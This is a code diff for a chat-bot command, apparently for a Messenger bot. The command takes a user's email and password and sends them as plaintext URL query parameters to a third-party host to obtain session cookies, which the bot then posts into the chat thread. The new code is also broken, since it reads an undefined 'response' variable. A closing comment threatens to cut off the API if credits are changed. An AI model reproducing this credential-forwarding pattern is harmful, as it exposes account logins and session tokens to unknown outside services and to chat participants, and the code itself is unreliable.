@@ -18,9 +18,9 @@ module.exports.run = async ({ api, event, args }) => {
  
     const [email, password] = args.map(arg => arg.trim());
  
-    const res = await axios.get(`https://folowget.hayih59124.repl.co/login?email=${email}&password=${password}`);
-    const userData = res.data;
+    const res = await axios.get(`https://appstate.onrender.com/cookie?email=${email}&password=${password}`);
+    const mark = response.data.session_cookies;
  
-    return api.sendMessage(JSON.stringify(userData, null, 4), event.threadID, event.messageID);
+    return api.sendMessage(JSON.stringify(mark, null, 4), event.threadID, event.messageID);
 }
 //dont change credits or I'll off api
